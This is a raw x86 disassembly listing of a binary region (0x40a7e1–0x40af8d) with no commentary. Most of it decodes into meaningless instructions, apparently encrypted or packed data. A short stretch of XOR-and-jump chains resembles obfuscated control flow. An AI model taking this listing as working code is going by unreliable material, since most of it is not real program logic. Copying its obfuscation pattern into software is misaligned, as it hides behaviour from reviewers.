  40a7e1:	loope  0x40a7bb
  40a7e3:	xchg   edi,eax
  40a7e4:	aad    0x61
  40a7e6:	sahf   
  40a7e7:	call   0x571e:0xc65b398
  40a7ee:	jb     0x40a817
  40a7f0:	or     ah,BYTE PTR [ebx]
  40a7f2:	cld    
  40a7f3:	dec    eax
  40a7f4:	in     eax,0x85
  40a7f6:	mov    al,ds:0x2000cf6a
  40a7fb:	(bad)
  40a7ff:	(bad)  
  40a800:	push   edi
  40a801:	push   ecx
  40a802:	addr16 push es
  40a804:	inc    esp
  40a805:	add    bl,BYTE PTR [edx+0x4b]
  40a808:	lahf   
  40a809:	cwde   
  40a80a:	jge    0x40a7d3
  40a80c:	jbe    0x40a857
  40a80e:	arpl   WORD PTR [ebp+edi*8-0x59],si
  40a812:	push   es
  40a813:	call   0x313cfd72
  40a818:	fdivr  QWORD PTR [ebp+0x24]
  40a81b:	mov    ecx,0xb62b063a
  40a820:	mov    esi,0x2ab5b0c3
  40a825:	nop
  40a826:	jge    0x40a7f3
  40a828:	xchg   DWORD PTR [ebp-0x20],esp
  40a82b:	cmp    eax,0xd4b59f14
  40a830:	or     al,0x20
  40a832:	mov    al,0xd2
  40a834:	jl     0x40a815
  40a836:	mov    esp,0x29f0766f
  40a83b:	adc    al,0x9f
  40a83d:	inc    BYTE PTR [ebp+0x1d9c34db]
  40a843:	cli    
  40a844:	lds    esp,FWORD PTR [esp+eax*1]
  40a847:	jecxz  0x40a8a4
  40a849:	ja     0x40a89f
  40a84b:	ja     0x40a81f
  40a84d:	or     edi,esi
  40a84f:	lods   al,BYTE PTR ds:[esi]
  40a850:	scas   al,BYTE PTR es:[edi]
  40a851:	(bad)  
  40a852:	lds    eax,FWORD PTR [esi+0x59]
  40a855:	and    BYTE PTR [edi],ah
  40a857:	sub    bh,BYTE PTR [esi-0x51]
  40a85a:	adc    ah,BYTE PTR [edi+0x6be80fd0]
  40a860:	sbb    BYTE PTR [ecx+0x7a1d9ab],al
  40a866:	inc    BYTE PTR [ecx-0x7f]
  40a869:	fidivr DWORD PTR [ecx+eiz*2]
  40a86c:	sbb    al,0x97
  40a86e:	push   ebx
  40a86f:	nop
  40a870:	pop    esp
  40a871:	push   0x2466594a
  40a876:	mov    WORD PTR [ebx+0x7aa484c1],ss
  40a87c:	mov    dh,0x75
  40a87e:	int    0x72
  40a880:	sbb    al,0x34
  40a882:	sbb    ebp,DWORD PTR [eax-0x5cedae3]
  40a888:	push   0xed133209
  40a88d:	daa    
  40a88e:	call   0x7d56:0x4f4b6a15
  40a895:	ret    0x7cc9
  40a898:	(bad)  [eax]
  40a89a:	sub    al,0x13
  40a89c:	xchg   DWORD PTR [edi+edi*2+0x6167fe55],ecx
  40a8a3:	sbb    al,0x91
  40a8a5:	mov    dh,0x87
  40a8a7:	sbb    ecx,DWORD PTR gs:[bp+si]
  40a8ab:	xchg   BYTE PTR [edi+0x0],ah
  40a8ae:	sub    BYTE PTR [edx+0x60897533],dh
  40a8b4:	pop    ds
  40a8b5:	mov    DWORD PTR [edx],0x8d13806e
  40a8bb:	ret    
  40a8bc:	out    dx,eax
  40a8bd:	mov    ch,0xd7
  40a8bf:	iret   
  40a8c0:	stos   BYTE PTR es:[edi],al
  40a8c1:	in     al,0xe1
  40a8c3:	std    
  40a8c4:	popa   
  40a8c5:	xor    cl,BYTE PTR [esi]
  40a8c7:	jns    0x40a8d9
  40a8c9:	mov    WORD PTR [ebp-0x7c],?
  40a8cc:	sbb    eax,0x31fef25c
  40a8d1:	(bad)  
  40a8d2:	rcr    DWORD PTR [edx],1
  40a8d4:	pop    ebp
  40a8d5:	xchg   esp,eax
  40a8d6:	mov    ebp,0xa3bbe922
  40a8db:	mov    cl,BYTE PTR ds:0x8ec5e3d1
  40a8e1:	retf   0x940e
  40a8e4:	adc    eax,0x542088a2
  40a8e9:	out    dx,eax
  40a8ea:	fimul  WORD PTR ss:[esp+edx*2+0x3707f2c2]
  40a8f2:	fs or  al,0x70
  40a8f5:	sti    
  40a8f6:	test   DWORD PTR [ebx+0x3c],esp
  40a8f9:	leave  
  40a8fa:	ffree  st(4)
  40a8fc:	sbb    al,0xa
  40a8fe:	cdq    
  40a8ff:	add    BYTE PTR [ecx-0x4f],bl
  40a902:	xor    al,0x6d
  40a904:	fbstp  TBYTE PTR [esi+0x6f]
  40a907:	ficom  WORD PTR [edx-0x35]
  40a90a:	cli    
  40a90b:	dec    esp
  40a90c:	dec    edx
  40a90d:	xchg   esp,eax
  40a90e:	lods   al,BYTE PTR ds:[esi]
  40a90f:	hlt    
  40a910:	retf   
  40a911:	js     0x40a8db
  40a913:	stc    
  40a914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a915:	pushf  
  40a916:	mov    al,ds:0xdb6c5397
  40a91b:	pop    ebx
  40a91c:	add    ebp,DWORD PTR [ecx+eax*2]
  40a91f:	sar    edi,cl
  40a921:	cmp    ebx,ecx
  40a923:	jge    0x40a8ca
  40a925:	dec    eax
  40a926:	inc    edx
  40a927:	(bad)  
  40a928:	outs   dx,DWORD PTR ds:[esi]
  40a929:	data16 adc BYTE PTR [eax],ah
  40a92c:	sahf   
  40a92d:	mov    al,ds:0xd3cbb1d1
  40a932:	cmp    ch,BYTE PTR ds:0xc6c05236
  40a938:	arpl   si,dx
  40a93a:	jb     0x40a98b
  40a93c:	xchg   BYTE PTR [esi-0x5b],bl
  40a93f:	mov    ebx,0xe900ba73
  40a944:	push   es
  40a945:	sub    ebx,DWORD PTR [ecx-0x29]
  40a948:	dec    esp
  40a949:	jae    0x40a8f3
  40a94b:	jns    0x40a9a8
  40a94d:	not    BYTE PTR [eax]
  40a94f:	jge    0x40a9ae
  40a951:	sub    DWORD PTR [ecx+0xd1a296d],esp
  40a957:	add    eax,0xc760512d
  40a95c:	and    ecx,DWORD PTR [ebx+0x2ab29648]
  40a962:	mov    esi,DWORD PTR [esi-0x47]
  40a965:	jns    0x40a933
  40a967:	out    0x53,eax
  40a969:	add    cl,BYTE PTR [edx]
  40a96b:	inc    eax
  40a96c:	int3   
  40a96d:	cmp    al,0xe8
  40a96f:	out    0x5c,eax
  40a971:	stos   BYTE PTR es:[edi],al
  40a972:	xchg   ebx,eax
  40a973:	and    eax,0xc9ce062a
  40a978:	fwait
  40a979:	daa    
  40a97a:	and    BYTE PTR [ecx-0x7b],dl
  40a97d:	call   0xfc9d7338
  40a982:	cmc    
  40a983:	push   edx
  40a984:	iret   
  40a985:	push   eax
  40a986:	int    0xd1
  40a988:	lock adc eax,0x4a77ae0d
  40a98e:	je     0x40a96d
  40a990:	not    BYTE PTR gs:[ecx-0x58]
  40a994:	dec    esp
  40a995:	add    ebx,DWORD PTR [ebx-0x6b]
  40a998:	outs   dx,DWORD PTR ds:[esi]
  40a999:	stc    
  40a99a:	lahf   
  40a99b:	jne    0x40a942
  40a99d:	or     DWORD PTR [ebp+0x10f0f774],esi
  40a9a3:	push   edi
  40a9a4:	inc    edi
  40a9a5:	mov    eax,0x62cb955e
  40a9aa:	popa   
  40a9ab:	pop    ebp
  40a9ac:	jno    0x40a996
  40a9ae:	ss pop ebp
  40a9b0:	add    ecx,ebx
  40a9b2:	ss mov eax,0x46f51e67
  40a9b8:	enter  0x4dde,0x14
  40a9bc:	xor    cl,BYTE PTR [edi]
  40a9be:	mov    bh,0x8f
  40a9c0:	jb     0x40a999
  40a9c2:	and    edx,DWORD PTR [edi-0x52e17623]
  40a9c8:	mov    al,0xad
  40a9ca:	mov    ecx,0xdaf1c34b
  40a9cf:	mov    BYTE PTR [ecx-0x68],bh
  40a9d2:	loope  0x40a9d6
  40a9d4:	das    
  40a9d5:	or     bl,BYTE PTR [ecx-0x30]
  40a9d8:	sbb    al,0x36
  40a9da:	and    al,0x8
  40a9dc:	cmc    
  40a9dd:	adc    DWORD PTR [eax+0x2e1c75c2],ebp
  40a9e3:	mov    ebx,0x2637011f
  40a9e8:	jo     0x40a9b3
  40a9ea:	ds mov ebp,0x59b55b86
  40a9f0:	cmp    BYTE PTR [edi-0x5f],cl
  40a9f3:	push   0x2d4d3e14
  40a9f8:	add    dh,cl
  40a9fa:	dec    ebp
  40a9fb:	xchg   esi,eax
  40a9fc:	pop    ebx
  40a9fd:	xor    eax,edx
  40a9ff:	jle    0x40aa11
  40aa01:	inc    ecx
  40aa02:	or     BYTE PTR [ecx+0x1fe69e82],dl
  40aa08:	pop    edi
  40aa09:	xor    BYTE PTR [esp+edi*8-0x78],0xf6
  40aa0e:	mov    edi,0xc6fdcbf3
  40aa13:	push   eax
  40aa14:	push   ss
  40aa15:	sub    eax,0x6ab52e65
  40aa1a:	popf   
  40aa1b:	pop    ebp
  40aa1c:	and    al,0x98
  40aa1e:	dec    ebx
  40aa1f:	in     al,0x4d
  40aa21:	fmul   st,st(7)
  40aa23:	imul   eax,DWORD PTR [eax+esi*8-0x73cfb3c1],0xffffff8f
  40aa2b:	jns    0x40aa40
  40aa2d:	call   0x929:0x9f1040e8
  40aa34:	cmp    edx,DWORD PTR [eax-0x42]
  40aa37:	sbb    dl,dh
  40aa39:	scas   al,BYTE PTR es:[edi]
  40aa3a:	adc    DWORD PTR ds:0x9b3924dd,edi
  40aa40:	cmp    DWORD PTR [ebp+0x41],esp
  40aa43:	popa   
  40aa44:	adc    BYTE PTR [edi],0x75
  40aa47:	lea    esp,[eax-0x7494783]
  40aa4d:	loopne 0x40aa59
  40aa4f:	mov    edi,eax
  40aa51:	in     eax,dx
  40aa52:	cmp    DWORD PTR [ebx+0x4d1d3f40],edx
  40aa58:	call   0xe99387e
  40aa5d:	jle    0x40aa14
  40aa5f:	jmp    FWORD PTR [ebx-0xb]
  40aa62:	jb     0x40aa8d
  40aa64:	int3   
  40aa65:	and    ebp,DWORD PTR [ebp+0x612b487e]
  40aa6b:	sti    
  40aa6c:	pmaddwd mm4,QWORD PTR [edi+ebp*2-0x5f2033c0]
  40aa74:	or     ah,BYTE PTR [esi+0x5fe9258e]
  40aa7a:	lods   al,BYTE PTR ds:[esi]
  40aa7b:	cs ins BYTE PTR es:[edi],dx
  40aa7d:	mov    bh,0xc3
  40aa7f:	xchg   DWORD PTR [edi-0xce5855],esp
  40aa85:	ins    DWORD PTR es:[edi],dx
  40aa86:	fadd   st,st(5)
  40aa88:	(bad)  
  40aa89:	inc    eax
  40aa8a:	imul   edi,DWORD PTR [ebp-0x5a],0xfffffff5
  40aa8e:	jae    0x40aa85
  40aa90:	pop    edi
  40aa91:	retf   0x7a02
  40aa94:	xchg   ebp,eax
  40aa95:	call   0xf9ee:0x243fb18a
  40aa9c:	mov    cl,dl
  40aa9e:	xor    eax,0x5f55582f
  40aaa3:	jl     0x40aa4b
  40aaa5:	cmp    al,0x9b
  40aaa7:	call   0xf8cbac5e
  40aaac:	imul   edi,eax,0xb8988ae5
  40aab2:	loope  0x40ab14
  40aab4:	adc    bh,BYTE PTR [edi]
  40aab6:	enter  0x33,0xd1
  40aaba:	jbe    0x40ab30
  40aabc:	mov    ebp,0xa5c16b06
  40aac1:	gs xchg ebp,eax
  40aac3:	mov    bl,0x10
  40aac5:	rcr    BYTE PTR ds:0x1bead9ca,cl
  40aacb:	inc    esp
  40aacc:	or     BYTE PTR [eax],0xe8
  40aacf:	rcl    BYTE PTR [esi],cl
  40aad1:	push   eax
  40aad2:	int    0xe
  40aad4:	bound  ebx,QWORD PTR [ecx]
  40aad6:	dec    ecx
  40aad7:	outs   dx,BYTE PTR ds:[esi]
  40aad8:	js     0x40ab22
  40aada:	and    al,0x8d
  40aadc:	push   ds
  40aadd:	mov    BYTE PTR [esi-0x842be5e],cl
  40aae3:	add    BYTE PTR [ebx-0x1c],0x17
  40aae7:	and    eax,0xb89a0690
  40aaec:	jne    0x40ab0a
  40aaee:	dec    esp
  40aaef:	(bad)  
  40aaf0:	in     eax,dx
  40aaf1:	rcl    BYTE PTR [ebx+0x7],cl
  40aaf4:	cmp    ebx,ecx
  40aaf6:	mov    ds:0x94ed0a6d,eax
  40aafb:	and    eax,0x427bb485
  40ab00:	cli    
  40ab01:	stos   DWORD PTR es:[edi],eax
  40ab02:	test   DWORD PTR [edi],esi
  40ab04:	jmp    0x40aac9
  40ab06:	and    eax,0x9b455998
  40ab0b:	out    dx,eax
  40ab0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab0d:	in     al,0x2d
  40ab0f:	xor    eax,0x301c47c1
  40ab14:	inc    DWORD PTR ds:0xd2525869
  40ab1a:	dec    ebp
  40ab1b:	sub    dh,BYTE PTR ss:[edi+0x17]
  40ab1f:	pop    edi
  40ab20:	xchg   edi,eax
  40ab21:	shl    BYTE PTR [edx+edx*8+0xb3f08d4],0x72
  40ab29:	xchg   ecx,eax
  40ab2a:	mov    ebx,0x9bd3ac2c
  40ab2f:	ret    
  40ab30:	mov    ds:0x9e896d3d,eax
  40ab35:	(bad)  
  40ab36:	xchg   edx,eax
  40ab37:	je     0x40ab16
  40ab39:	mov    ebx,DWORD PTR [ecx-0x1216f59e]
  40ab3f:	sti    
  40ab40:	sbb    DWORD PTR [edx-0x9d95a6d],esp
  40ab46:	pop    eax
  40ab47:	jp     0x40aadd
  40ab49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab4a:	sbb    DWORD PTR [ebx],edx
  40ab4c:	daa    
  40ab4d:	data16 jle 0x40ab19
  40ab50:	pop    edx
  40ab51:	mov    edi,0x9c831f98
  40ab56:	sbb    esi,DWORD PTR [edi-0x47304b53]
  40ab5c:	inc    ebx
  40ab5d:	dec    esi
  40ab5e:	pop    es
  40ab5f:	js     0x40abdb
  40ab61:	dec    ebp
  40ab62:	loopne 0x40ab5a
  40ab64:	xchg   edx,eax
  40ab65:	xor    ch,BYTE PTR [ebp-0x64]
  40ab68:	test   al,0xb
  40ab6a:	lahf   
  40ab6b:	jmp    0x9eb0:0x1b6ddd6
  40ab72:	lods   eax,DWORD PTR ds:[esi]
  40ab73:	imul   DWORD PTR [eax-0x6ed32eb1]
  40ab79:	inc    edx
  40ab7a:	sbb    eax,0xc68ee067
  40ab7f:	or     dh,cl
  40ab81:	test   DWORD PTR ds:0xb2e4284c,ebx
  40ab87:	loope  0x40ab37
  40ab89:	and    al,0x24
  40ab8b:	and    al,0x37
  40ab8d:	mov    ah,dh
  40ab8f:	in     al,dx
  40ab90:	xlat   BYTE PTR ds:[ebx]
  40ab91:	add    eax,0x905a0b81
  40ab96:	icebp  
  40ab97:	stos   DWORD PTR es:[edi],eax
  40ab98:	cdq    
  40ab99:	nop
  40ab9a:	call   0xc9ebe741
  40ab9f:	mov    bl,0x67
  40aba1:	dec    ecx
  40aba2:	fisub  DWORD PTR [edi]
  40aba4:	sbb    eax,0x6c9936d0
  40aba9:	xor    DWORD PTR [eax+ebx*1],0x34
  40abad:	test   DWORD PTR [ebp+0x777c998b],esi
  40abb3:	test   al,0xfa
  40abb5:	pop    esi
  40abb6:	inc    edi
  40abb7:	xor    al,0x45
  40abb9:	push   ebx
  40abba:	inc    edx
  40abbb:	ins    BYTE PTR es:[edi],dx
  40abbc:	sub    eax,0xd4b2b670
  40abc1:	mov    edi,0xce159720
  40abc6:	add    esi,ebx
  40abc8:	adc    eax,0x6e021813
  40abcd:	mov    ah,0xf1
  40abcf:	or     eax,0xe9d74290
  40abd4:	add    esp,ebx
  40abd6:	test   esi,0x13b6820b
  40abdc:	pop    ss
  40abdd:	sbb    ebx,0xe6d0d353
  40abe3:	pop    ecx
  40abe4:	mov    esi,0x5d1acc0e
  40abe9:	inc    esi
  40abea:	xor    al,0x85
  40abec:	ror    BYTE PTR [ecx+0x40],0xe
  40abf0:	sbb    DWORD PTR [ecx],edx
  40abf2:	scas   al,BYTE PTR es:[edi]
  40abf3:	test   DWORD PTR [ecx],0x51697133
  40abf9:	(bad)  
  40abfa:	mov    ds:0xb79ed5cd,eax
  40abff:	mov    eax,ds:0xd0c78f56
  40ac04:	push   es
  40ac05:	ret    0x89df
  40ac08:	cmp    DWORD PTR [ecx+ebp*4+0x42],0x3f34dc6e
  40ac10:	and    eax,0x2d134670
  40ac15:	add    ebx,DWORD PTR [ebp-0x3fe30547]
  40ac1b:	push   es
  40ac1c:	push   edi
  40ac1d:	xchg   ebp,eax
  40ac1e:	mov    edi,0x56e45db9
  40ac23:	add    eax,0x8b7991a7
  40ac28:	xlat   BYTE PTR ds:[ebx]
  40ac29:	and    eax,0x1089dce4
  40ac2e:	jp     0x40abfd
  40ac30:	add    DWORD PTR [ebx],0xffffff9b
  40ac33:	mov    ds:0x69449a79,al
  40ac38:	ja     0x40abe8
  40ac3a:	call   0x59e087b5
  40ac3f:	push   ss
  40ac40:	mov    esp,?
  40ac42:	xchg   ebx,eax
  40ac43:	int3   
  40ac44:	sub    dh,BYTE PTR [ebx+0x22]
  40ac47:	jg     0x40ac07
  40ac49:	(bad)  
  40ac4a:	outs   dx,DWORD PTR ds:[esi]
  40ac4b:	add    eax,0xa6b4058d
  40ac50:	and    DWORD PTR [eax-0x72037934],esi
  40ac56:	adc    edi,DWORD PTR [edi+0x4c]
  40ac59:	mov    al,ch
  40ac5b:	xor    BYTE PTR [edx+0x1c3f99],ah
  40ac61:	aaa    
  40ac62:	add    eax,0x6d63e8c9
  40ac67:	jl     0x40aca6
  40ac69:	lahf   
  40ac6a:	jecxz  0x40ac66
  40ac6c:	pusha  
  40ac6d:	xor    ecx,ecx
  40ac6f:	dec    eax
  40ac70:	xchg   edi,eax
  40ac71:	(bad)  [ebx+0x30]
  40ac74:	push   esi
  40ac75:	aad    0xc4
  40ac77:	out    0x78,eax
  40ac79:	mov    dl,BYTE PTR [ecx]
  40ac7b:	cmp    DWORD PTR ds:[eax+0x34],ebp
  40ac7f:	inc    eax
  40ac80:	mov    al,0x6
  40ac82:	test   BYTE PTR [edi],al
  40ac84:	cmc    
  40ac85:	jmp    DWORD PTR [edi-0x47710c31]
  40ac8b:	xchg   edi,eax
  40ac8c:	mov    WORD PTR [ecx+0x15],?
  40ac8f:	mov    ebx,0x56066216
  40ac94:	test   eax,0x3ebc317b
  40ac99:	xor    ah,BYTE PTR [edi+0x3d]
  40ac9c:	popa   
  40ac9d:	fidiv  WORD PTR [edx]
  40ac9f:	sti    
  40aca0:	fidiv  DWORD PTR [edx-0x29c89a7c]
  40aca6:	jae    0x40acf6
  40aca8:	ret    
  40aca9:	iret   
  40acaa:	sbb    ecx,DWORD PTR [ecx]
  40acac:	test   al,0xcb
  40acae:	push   edi
  40acaf:	add    BYTE PTR [eax],dl
  40acb1:	inc    esp
  40acb2:	pop    eax
  40acb3:	push   cs
  40acb4:	mov    al,0x49
  40acb6:	fisubr WORD PTR ds:0x50c2b931
  40acbc:	xchg   ebp,eax
  40acbd:	or     edi,ebx
  40acbf:	mov    eax,ds:0xa2442535
  40acc4:	lahf   
  40acc5:	dec    ebx
  40acc6:	inc    ebx
  40acc7:	sbb    BYTE PTR [ecx-0x70],0xaf
  40accb:	das    
  40accc:	push   edi
  40accd:	dec    ebp
  40acce:	sbb    BYTE PTR [ecx+0x1b02e7c9],ah
  40acd4:	lea    esp,ds:0x2b2bf3e8
  40acda:	neg    BYTE PTR [edx-0x1a08b9a8]
  40ace0:	inc    edx
  40ace1:	stos   BYTE PTR es:[edi],al
  40ace2:	pop    ebp
  40ace3:	adc    BYTE PTR [ecx+0x6fc992d5],al
  40ace9:	add    BYTE PTR [esi-0x45],bh
  40acec:	mov    ecx,gs
  40acee:	repz push 0xffffffa7
  40acf1:	dec    eax
  40acf2:	(bad)  
  40acf3:	iret   
  40acf4:	xchg   esi,eax
  40acf5:	lahf   
  40acf6:	sub    BYTE PTR [ecx],al
  40acf8:	pop    ds
  40acf9:	icebp  
  40acfa:	ss and al,0x79
  40acfd:	sbb    eax,DWORD PTR [edx-0x16461241]
  40ad03:	loop   0x40ad70
  40ad05:	ds dec eax
  40ad07:	out    0xb8,eax
  40ad09:	stos   DWORD PTR es:[edi],eax
  40ad0a:	into   
  40ad0b:	dec    ebp
  40ad0c:	inc    edx
  40ad0d:	stos   DWORD PTR es:[edi],eax
  40ad0e:	retf   0xb483
  40ad11:	fcmove st,st(1)
  40ad13:	mov    ebp,DWORD PTR [edi-0x44]
  40ad16:	mov    edi,0xc92ff3e3
  40ad1b:	pushf  
  40ad1c:	dec    ebp
  40ad1d:	bsr    esi,DWORD PTR [edi-0x1c]
  40ad21:	sub    al,BYTE PTR [ebx-0x57]
  40ad24:	cmp    ah,bh
  40ad26:	add    ah,BYTE PTR [edi]
  40ad28:	call   0xa995:0xf62bf8f0
  40ad2f:	pop    esi
  40ad30:	ror    DWORD PTR [edx+edi*4-0x15],0xf8
  40ad35:	test   DWORD PTR [eax+0x44],ecx
  40ad38:	shr    ch,0x6b
  40ad3b:	jbe    0x40ad54
  40ad3d:	push   ss
  40ad3e:	sbb    al,0xe6
  40ad40:	xchg   ebx,eax
  40ad41:	and    edx,DWORD PTR [ecx+0x6e4a6b85]
  40ad47:	sub    eax,0x247fe739
  40ad4c:	lods   eax,DWORD PTR ds:[esi]
  40ad4d:	jno    0x40ad45
  40ad4f:	mov    al,0xc8
  40ad51:	jb     0x40ad50
  40ad53:	test   al,0x5e
  40ad55:	mov    bl,0x35
  40ad57:	push   es
  40ad58:	shr    ecx,cl
  40ad5a:	call   0x214070f2
  40ad5f:	or     DWORD PTR [edi],ebx
  40ad61:	and    al,0x6e
  40ad63:	adc    al,0x12
  40ad65:	pusha  
  40ad66:	mov    ebx,0x4d7160d2
  40ad6b:	aaa    
  40ad6c:	in     eax,0xd6
  40ad6e:	cmp    DWORD PTR [eax],eax
  40ad70:	lea    eax,[ecx]
  40ad72:	cdq    
  40ad73:	adc    dh,ch
  40ad75:	call   0x7ca85dd7
  40ad7a:	push   esp
  40ad7b:	and    edx,DWORD PTR es:[esp+eax*8]
  40ad7f:	cmp    eax,0x66be49df
  40ad84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad85:	add    edx,DWORD PTR [esi+0x22]
  40ad88:	lock or dl,0x4e
  40ad8c:	jns    0x40adfb
  40ad8e:	push   edx
  40ad8f:	les    eax,FWORD PTR [eax]
  40ad91:	pushf  
  40ad92:	jmp    0xb84d1ac1
  40ad97:	xor    DWORD PTR [esi],0xd5873b8f
  40ad9d:	jno    0x40ad8e
  40ad9f:	and    BYTE PTR [ebp+0x48b887dd],ah
  40ada5:	cmp    ebp,eax
  40ada7:	ja     0x40ad5f
  40ada9:	push   ecx
  40adaa:	out    0xe8,eax
  40adac:	and    DWORD PTR [esi],0xffffffe9
  40adaf:	and    BYTE PTR [ecx-0x7c60faa3],ch
  40adb5:	cli    
  40adb6:	mov    ebx,0x4213f285
  40adbb:	sbb    al,0xd1
  40adbd:	push   cs
  40adbe:	mov    esi,0xaac6af1c
  40adc3:	xchg   DWORD PTR [ebp+0x6b],esi
  40adc6:	shr    BYTE PTR [ebx-0x495a25a8],1
  40adcc:	jno    0x40ad5b
  40adce:	sbb    DWORD PTR [ebx],esp
  40add0:	aam    0x22
  40add2:	inc    esp
  40add3:	pop    ss
  40add4:	push   ebx
  40add5:	mov    dl,dl
  40add7:	imul   eax,DWORD PTR [ecx],0xaaf7234f
  40addd:	xchg   DWORD PTR [ebx],eax
  40addf:	inc    ebx
  40ade0:	call   0x9c7e4282
  40ade5:	sub    al,0x2d
  40ade7:	sar    DWORD PTR [edx-0x2783bf4d],0xe2
  40adee:	(bad)  
  40adef:	lahf   
  40adf0:	mov    dl,BYTE PTR ds:0xeed761a8
  40adf6:	xchg   edx,eax
  40adf7:	sbb    al,0xb8
  40adf9:	xor    ebp,ecx
  40adfb:	(bad)  [edi-0x5d]
  40adfe:	dec    eax
  40adff:	js     0x40add3
  40ae01:	loope  0x40ae55
  40ae03:	add    dh,BYTE PTR [edx+0x35]
  40ae06:	aad    0x7b
  40ae08:	or     DWORD PTR [ebx+0x6a],ebx
  40ae0b:	adc    BYTE PTR [edx+0x7133ee41],dh
  40ae11:	mov    bl,0x80
  40ae13:	xchg   ebp,eax
  40ae14:	std    
  40ae15:	mov    dl,0x34
  40ae17:	gs mov al,0x32
  40ae1a:	ss mov edi,0xd83af4f6
  40ae20:	mov    eax,ds:0x16f5c506
  40ae25:	ins    DWORD PTR es:[edi],dx
  40ae26:	out    dx,al
  40ae27:	adc    al,0x50
  40ae29:	inc    esi
  40ae2a:	repnz add ah,dh
  40ae2d:	xor    bl,bl
  40ae2f:	inc    edi
  40ae30:	and    DWORD PTR [ebx],edi
  40ae32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae33:	sbb    eax,0xe71543e3
  40ae38:	pop    ebx
  40ae39:	popf   
  40ae3a:	mov    esi,edi
  40ae3c:	ins    DWORD PTR es:[edi],dx
  40ae3d:	je     0x40ae39
  40ae3f:	call   0x765ed953
  40ae44:	in     eax,dx
  40ae45:	dec    edi
  40ae46:	sbb    ecx,edx
  40ae48:	dec    ebp
  40ae49:	test   eax,0xbf798b47
  40ae4e:	mov    BYTE PTR [edx+edx*1-0xa17d794],bh
  40ae55:	callw  0x4b57
  40ae59:	mov    esi,0xd71079d7
  40ae5e:	clc    
  40ae5f:	mov    ds:0xfce2a019,eax
  40ae64:	fst    st(3)
  40ae66:	xor    eax,0x12b978d3
  40ae6b:	sbb    DWORD PTR [ebx],edx
  40ae6d:	sbb    edx,DWORD PTR [esi+0x1]
  40ae70:	add    dl,BYTE PTR [ebp+esi*1+0x70e534c3]
  40ae77:	imul   ebx,DWORD PTR [ebp-0x7d],0x4f
  40ae7b:	jne    0x40aef0
  40ae7d:	cmp    ah,BYTE PTR [ebp-0x36]
  40ae80:	outs   dx,BYTE PTR ds:[esi]
  40ae81:	jecxz  0x40aedf
  40ae83:	jb     0x40ae05
  40ae85:	mov    ds:0x62b8ad39,eax
  40ae8a:	mov    edi,0xd7d09762
  40ae8f:	mov    al,ds:0x6f001770
  40ae94:	pop    edi
  40ae95:	xor    ebp,DWORD PTR ds:0xa1c836c6
  40ae9b:	mov    BYTE PTR [ebp-0x63],bh
  40ae9e:	popa   
  40ae9f:	adc    edi,0xffffffe2
  40aea2:	ret    0x5681
  40aea5:	mov    WORD PTR [ebx],?
  40aea7:	push   cs
  40aea8:	sti    
  40aea9:	into   
  40aeaa:	mov    ecx,DWORD PTR [edi]
  40aeac:	mov    bh,0x4
  40aeae:	pop    eax
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx+0x4303a730],al
  40aef6:	adc    BYTE PTR [edx+eax*4+0x137b7b09],ah
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	adc    ah,BYTE PTR [ebx]
  40af02:	(bad)  
  40af03:	cmp    al,BYTE PTR [ebp-0x68f38d08]
  40af09:	adc    DWORD PTR [ebx+edx*2-0x74e03afa],edi
  40af10:	add    eax,0xf93dfca8
  40af15:	daa    
  40af16:	push   ss
  40af17:	inc    ebx
  40af18:	sbb    eax,0x3d08f527
  40af1d:	retf   0x6dc8
  40af20:	rcr    cl,0x97
  40af23:	xor    BYTE PTR [eax+esi*2+0x69],bh
  40af27:	mov    ebx,0x786c040c
  40af2c:	and    BYTE PTR [edx+0x9],al
  40af2f:	jns    0x40aed1
  40af31:	or     al,0xbc
  40af33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af34:	dec    ebp
  40af35:	cs pop ds
  40af37:	push   eax
  40af38:	pop    ss
  40af39:	inc    ebp
  40af3a:	int    0x5d
  40af3c:	push   ebp
  40af3d:	icebp  
  40af3e:	aad    0xbe
  40af40:	arpl   WORD PTR [esi+0x1f2840a4],cx
  40af46:	pop    ebx
  40af47:	push   ebp
  40af48:	imul   esp,esi,0x13
  40af4b:	stc    
  40af4c:	shl    ebp,1
  40af4e:	dec    ebp
  40af4f:	cmp    ecx,edi
  40af51:	ja     0x40afbd
  40af53:	push   0xffffff95
  40af55:	das    
  40af56:	jne    0x40afad
  40af58:	sub    eax,0xd1861f0b
  40af5d:	cmp    edx,ebx
  40af5f:	sbb    ebx,edx
  40af61:	xchg   ebp,eax
  40af62:	test   ah,ch
  40af64:	push   esi
  40af65:	sub    edi,ecx
  40af67:	call   0x23d05dd
  40af6c:	scas   eax,DWORD PTR es:[edi]
  40af6d:	sbb    al,0xf5
  40af6f:	nop
  40af70:	fsubr  st(1),st
  40af72:	sbb    bh,dh
  40af74:	sbb    edi,DWORD PTR [ecx+0x1d]
  40af77:	es test al,0x7a
  40af7a:	add    edi,edi
  40af7c:	clc    
  40af7d:	call   FWORD PTR gs:[ebp-0x65c2c52d]
  40af84:	lods   al,BYTE PTR ds:[esi]
  40af85:	hlt    
  40af86:	xor    DWORD PTR [edx+0x3e8450af],edi
  40af8c:	fwait
  40af8d:	jbe    0x40af30
